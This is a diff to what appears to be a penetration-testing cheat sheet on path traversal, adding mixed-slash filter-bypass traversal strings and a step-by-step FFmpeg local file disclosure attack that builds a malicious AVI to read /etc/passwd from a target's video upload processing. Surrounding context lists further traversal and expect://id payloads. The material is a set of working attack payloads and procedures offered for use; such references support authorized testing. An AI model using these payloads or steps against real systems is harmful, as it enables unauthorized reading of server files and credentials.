@@ -79,7 +79,23 @@ expect://id
 ....//....//etc/passwd
 ..%252f..%252fetc%252fpasswd
 %2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Mixed-slash filter bypass variants
+../\
+..\\/
+/..
+\/..
+/%5c..
 ```
+
+## FFmpeg local file disclosure
+
+Targets that accept video uploads and process HLS playlists server-side with FFmpeg may disclose arbitrary local files:
+
+1. Download gen_xbin_avi.py: https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py
+2. Generate malicious AVI: `python3 gen_xbin_avi.py file:///etc/passwd output.avi`
+3. Upload to target's video upload feature
+4. Play the uploaded video via the site — if FFmpeg processes the embedded HLS inclusion, the file contents appear in the video stream
 
 ## Chain Opportunities
 
